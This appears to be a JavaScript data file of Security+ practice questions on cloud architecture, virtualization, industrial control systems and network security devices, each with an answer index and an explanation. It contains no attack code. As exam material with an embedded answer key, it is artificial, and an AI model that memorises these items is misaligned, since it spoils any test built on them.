  { id:"D2-110", domain:2, obj:"2.5", diff:"hard", q:"A SOC wants the BEST way to detect malware that evades signature antivirus by living in memory. Which mitigation approach is MOST effective?", options:["Disabling guest accounts","Continuous behavioral monitoring with EDR and log correlation","Quarterly vulnerability scans","Stronger password policy"], answer:1, explain:"<strong>Continuous behavioral monitoring with EDR and log correlation</strong> is most effective because it detects anomalous process and behavior activity, catching fileless or memory-resident malware that signatures miss.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Quarterly vulnerability scans</b>: periodic scans find missing patches but do not continuously detect active in-memory malware behavior.</span><span class='qd'><b>Stronger password policy</b>: a stronger password policy resists credential attacks, it does not detect memory-resident malware.</span><span class='qd'><b>Disabling guest accounts</b>: removing guest accounts hardens access but does nothing to detect fileless malware in memory.</span>" }
);
SECPLUS.questions.push(
  { id:"D3-001", domain:3, obj:"3.1", diff:"easy", q:"In the SaaS cloud model, which party is primarily responsible for maintaining the underlying application code and the servers it runs on?", options:["The customer's security team","An independent auditor","The cloud service provider","The customer's end users"], answer:2, explain:"<strong>The cloud service provider</strong> manages the entire stack in SaaS: application code, runtime, OS, and hardware. The customer is responsible mainly for their data and user access.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>The customer's end users</b>: end users merely consume the application and manage their own data and credentials, not the underlying code or servers.</span><span class='qd'><b>The customer's security team</b>: in SaaS the customer security team governs data, identity, and access, but the provider owns the application and infrastructure.</span><span class='qd'><b>An independent auditor</b>: an auditor only assesses and attests to controls, it never operates or maintains the application or servers.</span>" },
  { id:"D3-002", domain:3, obj:"3.1", diff:"easy", q:"Which cloud service model gives the customer the most control over the operating system and installed software while the provider supplies only virtualized compute, storage, and networking?", options:["FaaS","SaaS","PaaS","IaaS"], answer:3, explain:"<strong>IaaS</strong> supplies virtualized compute, storage, and networking while the customer installs and manages the OS, middleware, and applications, giving the most control of the cloud models.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>SaaS</b>: in Software as a Service the provider controls everything including the application, so the customer has the least control.</span><span class='qd'><b>PaaS</b>: Platform as a Service manages the OS and runtime for you, removing OS-level control from the customer.</span><span class='qd'><b>FaaS</b>: Function as a Service abstracts servers and runtimes entirely, so the customer only supplies function code, not OS management.</span>" },
  { id:"D3-003", domain:3, obj:"3.1", diff:"easy", q:"What does a cloud responsibility matrix primarily document?", options:["Which security and operational tasks belong to the provider versus the customer","The physical location of every data center","The encryption algorithm used for data at rest","The cost of each cloud service tier"], answer:0, explain:"<strong>Which security and operational tasks belong to the provider versus the customer</strong> is exactly what a cloud responsibility (shared responsibility) matrix documents for each service model.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>The cost of each cloud service tier</b>: pricing is captured in billing or pricing sheets, not in a responsibility matrix.</span><span class='qd'><b>The physical location of every data center</b>: data residency and region details are governance or contract topics, not the purpose of a responsibility matrix.</span><span class='qd'><b>The encryption algorithm used for data at rest</b>: a specific cipher is a technical control detail, whereas the matrix only assigns who owns each control.</span>" },
  { id:"D3-004", domain:3, obj:"3.1", diff:"medium", q:"A development team wants to deploy code without managing any servers or runtimes, paying only for execution time. Which architecture best fits this requirement?", options:["On-premises bare metal","Serverless (Function as a Service)","Type 1 hypervisor cluster","Industrial control system"], answer:1, explain:"<strong>Serverless (Function as a Service)</strong> abstracts away server and runtime management; the provider runs functions on demand and bills only for execution time.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>On-premises bare metal</b>: this requires the team to own and manage the physical servers, the opposite of no server management.</span><span class='qd'><b>Type 1 hypervisor cluster</b>: running a bare-metal hypervisor cluster still requires managing hosts and VMs, not a pay-per-execution model.</span><span class='qd'><b>Industrial control system</b>: an ICS supervises physical industrial processes and has nothing to do with deploying application code.</span>" },
  { id:"D3-005", domain:3, obj:"3.1", diff:"medium", q:"Which characteristic most distinguishes a microservices architecture from a traditional monolithic application?", options:["It requires a single shared database for all components","It can only run on physical hardware","Functionality is decomposed into small, independently deployable services","It eliminates the need for any network communication"], answer:2, explain:"<strong>Functionality is decomposed into small, independently deployable services</strong> is the defining trait of microservices, which communicate over APIs and can be scaled and released separately.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>It can only run on physical hardware</b>: microservices commonly run in containers and VMs, not exclusively on physical hardware.</span><span class='qd'><b>It eliminates the need for any network communication</b>: microservices rely heavily on network calls between services, increasing rather than removing network communication.</span><span class='qd'><b>It requires a single shared database for all components</b>: microservices favor separate data stores per service, which is the opposite of a single shared database.</span>" },
  { id:"D3-006", domain:3, obj:"3.1", diff:"medium", q:"A Type 1 hypervisor differs from a Type 2 hypervisor in that it:", options:["Can only virtualize a single guest at a time","Is used exclusively for desktop virtualization","Runs as an application on top of a host operating system","Runs directly on the physical hardware (bare metal)"], answer:3, explain:"<strong>Runs directly on the physical hardware (bare metal)</strong> defines a Type 1 hypervisor, which is more efficient and offers stronger isolation than a Type 2 hypervisor.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Runs as an application on top of a host operating system</b>: that describes a Type 2 hypervisor, not a Type 1.</span><span class='qd'><b>Can only virtualize a single guest at a time</b>: both hypervisor types can host many guests simultaneously.</span><span class='qd'><b>Is used exclusively for desktop virtualization</b>: desktop virtualization is a typical Type 2 use case, while Type 1 hypervisors run enterprise server workloads.</span>" },
  { id:"D3-007", domain:3, obj:"3.1", diff:"medium", q:"VM sprawl introduces security risk primarily because:", options:["Unmanaged and unpatched VMs accumulate, expanding the attack surface","Hypervisors cannot enforce any isolation","All VMs must share one IP address","Virtual machines run faster than physical servers"], answer:0, explain:"<strong>Unmanaged and unpatched VMs accumulate, expanding the attack surface</strong> is the core risk of VM sprawl, since forgotten machines become unpatched entry points.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Virtual machines run faster than physical servers</b>: relative speed is irrelevant to sprawl, which is about uncontrolled proliferation, not performance.</span><span class='qd'><b>Hypervisors cannot enforce any isolation</b>: hypervisors do enforce isolation between guests, so this statement is simply false.</span><span class='qd'><b>All VMs must share one IP address</b>: each VM has its own network identity, and shared addressing is not a property of sprawl.</span>" },
  { id:"D3-008", domain:3, obj:"3.1", diff:"easy", q:"Which term describes many small, internet-connected consumer and sensor devices that often ship with weak default credentials?", options:["SCADA","IoT","SAN","CDN"], answer:1, explain:"<strong>IoT</strong> (Internet of Things) describes numerous small, internet-connected consumer and sensor devices that frequently ship with weak default credentials.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>SCADA</b>: SCADA is an industrial supervisory control system, not a category of consumer sensor devices.</span><span class='qd'><b>SAN</b>: a Storage Area Network is high-speed block storage infrastructure, unrelated to consumer connected devices.</span><span class='qd'><b>CDN</b>: a Content Delivery Network caches and serves web content from edge nodes, not a class of sensor devices.</span>" },
  { id:"D3-009", domain:3, obj:"3.1", diff:"medium", q:"In an industrial environment, what is the primary role of a SCADA system?", options:["Providing wireless guest access","Hosting customer-facing web applications","Supervising and controlling distributed industrial processes and equipment","Encrypting email between offices"], answer:2, explain:"<strong>Supervising and controlling distributed industrial processes and equipment</strong> is the primary role of a SCADA system, monitoring assets like power, water, and manufacturing.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Hosting customer-facing web applications</b>: that is the job of web and application servers, not an industrial control system.</span><span class='qd'><b>Encrypting email between offices</b>: email security is handled by mail gateways and TLS, not SCADA.</span><span class='qd'><b>Providing wireless guest access</b>: guest Wi-Fi is delivered by access points and captive portals, unrelated to industrial process control.</span>" },
  { id:"D3-010", domain:3, obj:"3.1", diff:"hard", q:"A manufacturer runs legacy ICS equipment that cannot be patched and uses unauthenticated protocols. Which approach BEST reduces risk without replacing the equipment?", options:["Install antivirus on each programmable logic controller","Enable automatic OS updates on the controllers","Expose the devices directly to the internet for remote vendor support","Place the ICS on an isolated, segmented network with strict access controls"], answer:3, explain:"<strong>Place the ICS on an isolated, segmented network with strict access controls</strong> best protects unpatchable legacy equipment by limiting who and what can reach it.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Expose the devices directly to the internet for remote vendor support</b>: directly exposing unauthenticated, unpatchable devices dramatically increases risk rather than reducing it.</span><span class='qd'><b>Install antivirus on each programmable logic controller</b>: PLCs typically cannot run endpoint antivirus and their fixed firmware does not support it.</span><span class='qd'><b>Enable automatic OS updates on the controllers</b>: the scenario states the equipment cannot be patched, so automatic updates are not feasible.</span>" },
  { id:"D3-011", domain:3, obj:"3.1", diff:"hard", q:"An organization must keep highly sensitive data on systems it fully controls due to strict regulatory mandates, while still using cloud for less-sensitive workloads. Which deployment model MOST directly supports this need?", options:["Hybrid cloud","Single-tenant SaaS","Serverless only","Public cloud only"], answer:0, explain:"<strong>Hybrid cloud</strong> lets the organization keep regulated data on-premises or in a private cloud while using public cloud for less-sensitive workloads.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Public cloud only</b>: a public-only model places all data in the provider environment, which conflicts with keeping sensitive data on fully controlled systems.</span><span class='qd'><b>Single-tenant SaaS</b>: single-tenant SaaS is still a provider-hosted application and does not give the organization self-controlled hosting of regulated data.</span><span class='qd'><b>Serverless only</b>: serverless runs entirely in the provider cloud, offering no on-premises retention of regulated data.</span>" },
  { id:"D3-012", domain:3, obj:"3.1", diff:"medium", q:"Which property of embedded systems most often complicates patching and long-term security?", options:["They always have unlimited storage","They are purpose-built with fixed firmware and long service lifespans","They cannot connect to any network","They run a full desktop operating system"], answer:1, explain:"<strong>They are purpose-built with fixed firmware and long service lifespans</strong> is what most complicates embedded patching, since updates are infrequent or unavailable over a device's long life.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>They always have unlimited storage</b>: embedded systems are resource-constrained, not unlimited, and storage size is not the patching obstacle.</span><span class='qd'><b>They cannot connect to any network</b>: many embedded devices are network-connected, which is part of why their lack of patching is risky.</span><span class='qd'><b>They run a full desktop operating system</b>: embedded systems run specialized lightweight firmware, not full desktop operating systems.</span>" },
  { id:"D3-013", domain:3, obj:"3.1", diff:"easy", q:"Which deployment keeps all servers, storage, and network gear physically located and managed within the organization's own facilities?", options:["Serverless","Public cloud","On-premises","SaaS"], answer:2, explain:"<strong>On-premises</strong> infrastructure is owned, housed, and operated within the organization's own facilities rather than by a third party.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Public cloud</b>: public cloud resources are hosted and managed in a provider's data centers, not on the organization's premises.</span><span class='qd'><b>SaaS</b>: SaaS is a provider-hosted application model, so the servers are not located in the organization's facilities.</span><span class='qd'><b>Serverless</b>: serverless runs in the provider cloud with no customer-managed physical gear on site.</span>" },
  { id:"D3-014", domain:3, obj:"3.1", diff:"medium", q:"Compared to a single large monolith, a key security benefit of containerized microservices is:", options:["All services automatically trust each other","There is no need to scan images for vulnerabilities","Containers remove the need for access control","A compromise can be more easily contained to one isolated service"], answer:3, explain:"<strong>A compromise can be more easily contained to one isolated service</strong> because containerized microservices limit blast radius compared to a single large monolith.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Containers remove the need for access control</b>: containers still require strong access control between services, and removing it would weaken security.</span><span class='qd'><b>All services automatically trust each other</b>: implicit mutual trust is a vulnerability, not a benefit, and contradicts zero-trust segmentation.</span><span class='qd'><b>There is no need to scan images for vulnerabilities</b>: container images must still be scanned, as they can carry vulnerable libraries and base layers.</span>" },
  { id:"D3-015", domain:3, obj:"3.1", diff:"hard", q:"A startup expects unpredictable, bursty traffic and wants to avoid paying for idle capacity while minimizing operational overhead. Which architecture is the MOST cost-aligned choice?", options:["Serverless functions that scale automatically with demand","A single oversized virtual machine running continuously","A dedicated mainframe","On-premises data center sized for peak load"], answer:0, explain:"<strong>Serverless functions that scale automatically with demand</strong> bill per execution and match cost to actual bursty usage with minimal operational overhead.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>On-premises data center sized for peak load</b>: provisioning for peak wastes money on idle capacity during low-traffic periods.</span><span class='qd'><b>A single oversized virtual machine running continuously</b>: an always-on oversized VM still pays for idle capacity and does not auto-scale to bursts.</span><span class='qd'><b>A dedicated mainframe</b>: a mainframe is a costly fixed-capacity investment with high overhead, the opposite of pay-per-use elasticity.</span>" },
  { id:"D3-016", domain:3, obj:"3.1", diff:"medium", q:"In a PaaS offering, which task typically remains the customer's responsibility?", options:["Maintaining the physical servers","Developing and securing the application code they deploy","Replacing failed disk drives","Patching the host operating system"], answer:1, explain:"<strong>Developing and securing the application code they deploy</strong> remains the customer's job in PaaS, since the provider handles the OS, runtime, and hardware.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Patching the host operating system</b>: in PaaS the provider patches and maintains the underlying OS.</span><span class='qd'><b>Maintaining the physical servers</b>: physical hardware is always the provider's responsibility in PaaS.</span><span class='qd'><b>Replacing failed disk drives</b>: hardware replacement is handled by the provider, not the PaaS customer.</span>" },
  { id:"D3-017", domain:3, obj:"3.1", diff:"hard", q:"A security team must reduce the risk that a single compromised tenant in a multi-tenant public cloud affects others. Which provider-side property is MOST relevant to evaluate?", options:["The number of provider employees","The provider's marketing tier","Logical isolation and segmentation between tenants","The color of the data center"], answer:2, explain:"<strong>Logical isolation and segmentation between tenants</strong> is the most relevant provider property, since strong isolation stops one compromised tenant from reaching another.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>The provider's marketing tier</b>: marketing labels do not describe the technical controls that separate tenant workloads.</span><span class='qd'><b>The color of the data center</b>: physical appearance has no bearing on tenant isolation or security.</span><span class='qd'><b>The number of provider employees</b>: staff headcount does not determine whether tenants are logically isolated from one another.</span>" },
  { id:"D3-018", domain:3, obj:"3.1", diff:"easy", q:"Which of the following is a defining trait of cloud computing's elasticity?", options:["All resources must be purchased years in advance","Computing only happens at night","Resources are fixed and cannot change","Resources scale up or down automatically with demand"], answer:3, explain:"<strong>Resources scale up or down automatically with demand</strong> is the defining trait of cloud elasticity, matching capacity to workload dynamically.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Resources are fixed and cannot change</b>: fixed capacity is the opposite of elasticity.</span><span class='qd'><b>All resources must be purchased years in advance</b>: advance bulk purchasing describes traditional capital provisioning, not elastic cloud scaling.</span><span class='qd'><b>Computing only happens at night</b>: time-of-day restrictions have nothing to do with the on-demand scaling that elasticity provides.</span>" },
  { id:"D3-019", domain:3, obj:"3.1", diff:"medium", q:"Why are RTOS-based embedded devices in critical infrastructure often considered high-value targets?", options:["They control physical processes where a failure can cause safety impacts","They are never connected to networks","They store large amounts of customer credit card data","They have abundant compute to run modern EDR"], answer:0, explain:"<strong>They control physical processes where a failure can cause safety impacts</strong> makes RTOS-based critical-infrastructure devices high-value targets, because compromise can harm people or operations.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>They have abundant compute to run modern EDR</b>: these devices are resource-constrained and usually cannot run heavyweight endpoint detection tools.</span><span class='qd'><b>They are never connected to networks</b>: many are networked for monitoring and control, which is part of why they are targeted.</span><span class='qd'><b>They store large amounts of customer credit card data</b>: industrial controllers govern processes, not payment card databases.</span>" },
  { id:"D3-020", domain:3, obj:"3.1", diff:"medium", q:"An organization adopts containers instead of full virtual machines mainly to gain:", options:["Stronger hardware-level isolation than VMs","Lightweight, fast-starting, OS-level isolation with less overhead","The ability to avoid all image scanning","Guaranteed immunity from kernel exploits"], answer:1, explain:"<strong>Lightweight, fast-starting, OS-level isolation with less overhead</strong> is the main reason to use containers, which share the host kernel for efficiency.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Stronger hardware-level isolation than VMs</b>: containers provide weaker isolation than VMs because they share the host kernel rather than virtualizing hardware.</span><span class='qd'><b>The ability to avoid all image scanning</b>: container images still require vulnerability scanning, so this is not a benefit.</span><span class='qd'><b>Guaranteed immunity from kernel exploits</b>: because containers share the host kernel, a kernel exploit can affect them, so immunity is not guaranteed.</span>" },
  { id:"D3-021", domain:3, obj:"3.2", diff:"easy", q:"What is the primary purpose of a network DMZ (screened subnet)?", options:["To provide wireless access to guests only","To store backup tapes","To host internet-facing services in a buffer zone between untrusted and trusted networks","To replace the need for firewalls"], answer:2, explain:"<strong>To host internet-facing services in a buffer zone between untrusted and trusted networks</strong> is the purpose of a DMZ, isolating public services from the internal LAN.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>To store backup tapes</b>: backup media storage is a physical and data-protection concern, not a network buffer zone.</span><span class='qd'><b>To replace the need for firewalls</b>: a DMZ is created using firewalls, not as a substitute for them.</span><span class='qd'><b>To provide wireless access to guests only</b>: guest Wi-Fi is a separate isolation use case, not the defining purpose of a screened subnet.</span>" },
  { id:"D3-022", domain:3, obj:"3.2", diff:"easy", q:"Which device inspects traffic and can actively block malicious packets inline rather than only alerting?", options:["SIEM","NTP server","IDS","IPS"], answer:3, explain:"<strong>IPS</strong> sits inline and can actively drop or block malicious packets, going beyond detection.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>IDS</b>: an Intrusion Detection System only detects and alerts; it cannot block traffic inline.</span><span class='qd'><b>SIEM</b>: a SIEM aggregates and correlates logs for analysis and alerting, but it does not sit inline to block packets.</span><span class='qd'><b>NTP server</b>: an NTP server synchronizes time and has no traffic inspection or blocking function.</span>" },
  { id:"D3-023", domain:3, obj:"3.2", diff:"easy", q:"A Web Application Firewall (WAF) is specifically designed to protect against:", options:["Application-layer attacks such as SQL injection and cross-site scripting","Power outages","DNS root server failures","Physical theft of servers"], answer:0, explain:"<strong>Application-layer attacks such as SQL injection and cross-site scripting</strong> are exactly what a WAF inspects HTTP and HTTPS traffic to block at layer 7.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Physical theft of servers</b>: physical theft is addressed by physical security controls, not a web application firewall.</span><span class='qd'><b>Power outages</b>: power continuity is handled by UPS and generators, outside a WAF's scope.</span><span class='qd'><b>DNS root server failures</b>: root DNS availability is an internet infrastructure issue, not something a WAF protects against.</span>" },
  { id:"D3-024", domain:3, obj:"3.2", diff:"medium", q:"What advantage does a Next-Generation Firewall (NGFW) provide over a traditional packet-filtering firewall?", options:["It only filters based on source IP","It adds application awareness, deep packet inspection, and integrated threat intelligence","It cannot perform any stateful inspection","It blocks all encrypted traffic by default"], answer:1, explain:"<strong>It adds application awareness, deep packet inspection, and integrated threat intelligence</strong> is what an NGFW provides beyond simple port and IP filtering.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>It only filters based on source IP</b>: source-IP-only filtering describes a basic packet filter, the opposite of an NGFW.</span><span class='qd'><b>It cannot perform any stateful inspection</b>: NGFWs perform stateful inspection and build on it, so this is false.</span><span class='qd'><b>It blocks all encrypted traffic by default</b>: NGFWs inspect and forward encrypted traffic, often via TLS inspection, rather than blocking it wholesale.</span>" },
  { id:"D3-025", domain:3, obj:"3.2", diff:"medium", q:"A jump server (jump box) is best described as:", options:["A load balancer for web traffic","A server that automatically reboots failed services","A hardened, monitored host used as a controlled pivot point to access sensitive network segments","A backup power supply"], answer:2, explain:"<strong>A hardened, monitored host used as a controlled pivot point to access sensitive network segments</strong> defines a jump server, providing a single audited entry path.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>A server that automatically reboots failed services</b>: automatic service restart is a monitoring or orchestration function, not a jump box.</span><span class='qd'><b>A backup power supply</b>: backup power is provided by a UPS or generator, unrelated to administrative access pivoting.</span><span class='qd'><b>A load balancer for web traffic</b>: a load balancer distributes requests across servers, not a controlled access pivot.</span>" },
  { id:"D3-026", domain:3, obj:"3.2", diff:"medium", q:"Which statement correctly contrasts IPsec and TLS for securing communications?", options:["TLS only works for email and IPsec only for web browsing","Neither provides encryption","IPsec cannot create VPN tunnels","IPsec secures traffic at the network layer; TLS secures at the transport/session layer"], answer:3, explain:"<strong>IPsec secures traffic at the network layer; TLS secures at the transport/session layer</strong> correctly contrasts the two, with IPsec common for site-to-site VPNs and TLS for application sessions like HTTPS.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>TLS only works for email and IPsec only for web browsing</b>: both protocols secure many traffic types, and these specific restrictions are inaccurate.</span><span class='qd'><b>Neither provides encryption</b>: both IPsec and TLS provide encryption, so this is plainly false.</span><span class='qd'><b>IPsec cannot create VPN tunnels</b>: IPsec is a primary protocol for building VPN tunnels, so this is the opposite of the truth.</span>" },
  { id:"D3-027", domain:3, obj:"3.2", diff:"medium", q:"Port security on a switch is commonly used to:", options:["Restrict which MAC addresses may connect to a given port","Encrypt all frames on the wire","Replace the need for VLANs","Increase the speed of all ports"], answer:0, explain:"<strong>Restrict which MAC addresses may connect to a given port</strong> is what port security does, helping prevent unauthorized devices and MAC flooding.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Increase the speed of all ports</b>: port security is an access control feature and does not affect link speed.</span><span class='qd'><b>Encrypt all frames on the wire</b>: frame encryption is provided by protocols like MACsec, not by MAC-based port security.</span><span class='qd'><b>Replace the need for VLANs</b>: VLANs segment broadcast domains, a separate function port security does not replace.</span>" },
  { id:"D3-028", domain:3, obj:"3.2", diff:"hard", q:"A security architect must decide how a network firewall should behave if it loses power or crashes in an environment where availability is more critical than confidentiality. Which configuration BEST matches that priority?", options:["Fail-closed, blocking all traffic","Fail-open, allowing traffic to continue flowing","Disable logging entirely","Remove the firewall from the path permanently"], answer:1, explain:"<strong>Fail-open, allowing traffic to continue flowing</strong> best matches an environment where availability outweighs confidentiality, since traffic keeps moving during failure.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Fail-closed, blocking all traffic</b>: fail-closed prioritizes confidentiality and security by stopping traffic, contrary to the stated availability priority.</span><span class='qd'><b>Disable logging entirely</b>: disabling logging is a poor practice and does not address how the device behaves on failure.</span><span class='qd'><b>Remove the firewall from the path permanently</b>: permanently removing the firewall eliminates protection entirely rather than choosing a failure mode.</span>" },
  { id:"D3-029", domain:3, obj:"3.2", diff:"hard", q:"For a security control where confidentiality must be preserved even during a device failure, which failure mode is the MOST appropriate default?", options:["Fail-silent with traffic mirroring","Fail-open","Fail-closed (fail-secure)","Fail-random"], answer:2, explain:"<strong>Fail-closed (fail-secure)</strong> denies traffic or access when the control fails, preserving confidentiality even at the cost of availability.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Fail-open</b>: fail-open keeps traffic flowing on failure, favoring availability and risking confidentiality.</span><span class='qd'><b>Fail-random</b>: a random failure behavior is not a real, predictable security failure mode and offers no consistent protection.</span><span class='qd'><b>Fail-silent with traffic mirroring</b>: silently mirroring traffic does not block access and would not protect confidentiality during a failure.</span>" },
  { id:"D3-030", domain:3, obj:"3.2", diff:"medium", q:"In an active/passive high-availability firewall pair, the passive node:", options:["Is powered off and never used","Handles only logging duties","Processes half of all traffic at all times","Stands by and takes over only if the active node fails"], answer:3, explain:"<strong>Stands by and takes over only if the active node fails</strong> describes the passive node in active/passive HA, remaining synchronized until failover.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Processes half of all traffic at all times</b>: sharing traffic continuously describes active/active, not active/passive.</span><span class='qd'><b>Is powered off and never used</b>: the passive node stays powered and synchronized so it can take over instantly.</span><span class='qd'><b>Handles only logging duties</b>: the passive node is a full standby firewall, not a logging-only device.</span>" },
  { id:"D3-031", domain:3, obj:"3.2", diff:"medium", q:"A forward proxy primarily provides which benefit for outbound client traffic?", options:["It centralizes control, filtering, and logging of clients' outbound web requests","It eliminates the need for DNS","It encrypts disks at rest","It accelerates inbound traffic to public web servers only"], answer:0, explain:"<strong>It centralizes control, filtering, and logging of clients' outbound web requests</strong> is the primary benefit of a forward proxy sitting between internal clients and the internet.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>It accelerates inbound traffic to public web servers only</b>: accelerating and fronting inbound server traffic describes a reverse proxy, not a forward proxy.</span><span class='qd'><b>It eliminates the need for DNS</b>: clients still rely on DNS for name resolution, which a proxy does not replace.</span><span class='qd'><b>It encrypts disks at rest</b>: disk encryption is an endpoint storage control unrelated to a web proxy.</span>" },
  { id:"D3-032", domain:3, obj:"3.2", diff:"medium", q:"A reverse proxy is typically deployed to:", options:["Hide internal clients when browsing the web","Front-end and protect backend servers, often adding load balancing and TLS termination","Replace the organization's switches","Assign IP addresses via DHCP"], answer:1, explain:"<strong>Front-end and protect backend servers, often adding load balancing and TLS termination</strong> is the typical role of a reverse proxy.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Hide internal clients when browsing the web</b>: concealing outbound clients is the role of a forward proxy, not a reverse proxy.</span><span class='qd'><b>Replace the organization's switches</b>: switches handle layer-2 forwarding, a function a reverse proxy does not perform.</span><span class='qd'><b>Assign IP addresses via DHCP</b>: dynamic address assignment is the job of a DHCP server, not a proxy.</span>" },
  { id:"D3-033", domain:3, obj:"3.2", diff:"easy", q:"What does SD-WAN primarily improve for organizations with many branch sites?", options:["Battery life of laptops","Physical door access control","Centralized, software-defined management and optimization of wide-area connectivity","Local printer sharing"], answer:2, explain:"<strong>Centralized, software-defined management and optimization of wide-area connectivity</strong> is what SD-WAN delivers, intelligently routing across multiple transports.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Physical door access control</b>: door access is a physical security control unrelated to wide-area networking.</span><span class='qd'><b>Local printer sharing</b>: printer sharing is a local LAN service, not a WAN optimization technology.</span><span class='qd'><b>Battery life of laptops</b>: endpoint power management has nothing to do with branch WAN connectivity.</span>" },
  { id:"D3-034", domain:3, obj:"3.2", diff:"hard", q:"A company with a heavily remote workforce wants cloud-delivered security (SWG, CASB, ZTNA, FWaaS) converged with networking and applied close to users. Which model BEST describes this goal?", options:["A traditional hub-and-spoke VPN concentrator only","Air-gapped networking","A single on-premises NGFW at headquarters","SASE (Secure Access Service Edge)"], answer:3, explain:"<strong>SASE (Secure Access Service Edge)</strong> converges SD-WAN networking with cloud-delivered security services like SWG, CASB, ZTNA, and FWaaS applied close to users.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>A single on-premises NGFW at headquarters</b>: backhauling remote users to one HQ firewall is the centralized model SASE is designed to replace.</span><span class='qd'><b>A traditional hub-and-spoke VPN concentrator only</b>: a VPN concentrator alone does not converge the full suite of cloud security services near the user.</span><span class='qd'><b>Air-gapped networking</b>: air-gapping isolates networks entirely and cannot serve a cloud-connected remote workforce.</span>" },
  { id:"D3-035", domain:3, obj:"3.2", diff:"medium", q:"Which placement is MOST appropriate for an inline IPS that should inspect traffic entering the internal network from the internet?", options:["Inline at the network perimeter between the firewall and internal network","Only on a single employee's laptop","Inside the guest Wi-Fi captive portal","On an isolated air-gapped lab segment"], answer:0, explain:"<strong>Inline at the network perimeter between the firewall and internal network</strong> is the correct placement so the IPS can actively inspect and block traffic entering from the internet.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>On an isolated air-gapped lab segment</b>: an air-gapped lab carries no internet ingress traffic, so the IPS would inspect nothing relevant.</span><span class='qd'><b>Only on a single employee's laptop</b>: a single host placement cannot inspect traffic entering the whole internal network.</span><span class='qd'><b>Inside the guest Wi-Fi captive portal</b>: a captive portal handles guest authentication and does not sit inline on the internet-to-internal path.</span>" },
  { id:"D3-036", domain:3, obj:"3.2", diff:"medium", q:"A UTM (Unified Threat Management) appliance is characterized by:", options:["Performing only basic packet filtering","Combining multiple security functions such as firewall, IPS, antivirus, and content filtering in one device","Encrypting only email","Replacing the need for any endpoint protection"], answer:1, explain:"<strong>Combining multiple security functions such as firewall, IPS, antivirus, and content filtering in one device</strong> characterizes a UTM appliance, simplifying management.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Performing only basic packet filtering</b>: basic packet filtering is a single function, whereas UTM consolidates many.</span><span class='qd'><b>Encrypting only email</b>: email encryption is one narrow capability, not the broad consolidation a UTM provides.</span><span class='qd'><b>Replacing the need for any endpoint protection</b>: a UTM is a network appliance and does not eliminate the need for host-based endpoint protection.</span>" },
  { id:"D3-037", domain:3, obj:"3.2", diff:"hard", q:"An administrator needs remote vendors to reach only a few specific internal management interfaces without granting broad network access. Which design choice is the BEST fit?", options:["Share a single admin password by email","Give vendors full VPN access to the entire LAN","Require vendors to connect through a hardened, logged jump server with limited reach","Open the management ports directly to the internet"], answer:2, explain:"<strong>Require vendors to connect through a hardened, logged jump server with limited reach</strong> exposes only the needed management interfaces while auditing vendor activity.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Give vendors full VPN access to the entire LAN</b>: broad LAN access violates least privilege and exposes far more than the few interfaces needed.</span><span class='qd'><b>Open the management ports directly to the internet</b>: exposing management ports publicly invites attack and provides no access control or logging.</span><span class='qd'><b>Share a single admin password by email</b>: emailing a shared password destroys accountability and is a serious credential exposure.</span>" },
  { id:"D3-038", domain:3, obj:"3.2", diff:"medium", q:"Which VPN approach is typically used to permanently connect two office networks together over the internet?", options:["A one-time captive portal","A reverse proxy","Clientless SSL VPN for individual users","Site-to-site IPsec VPN"], answer:3, explain:"<strong>Site-to-site IPsec VPN</strong> creates persistent encrypted tunnels between gateways, permanently joining two office networks over the internet.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Clientless SSL VPN for individual users</b>: a clientless SSL VPN serves individual remote user sessions, not a permanent network-to-network link.</span><span class='qd'><b>A one-time captive portal</b>: a captive portal authenticates individual users for temporary access, not a persistent site link.</span><span class='qd'><b>A reverse proxy</b>: a reverse proxy fronts servers for inbound requests and does not join two networks with an encrypted tunnel.</span>" },
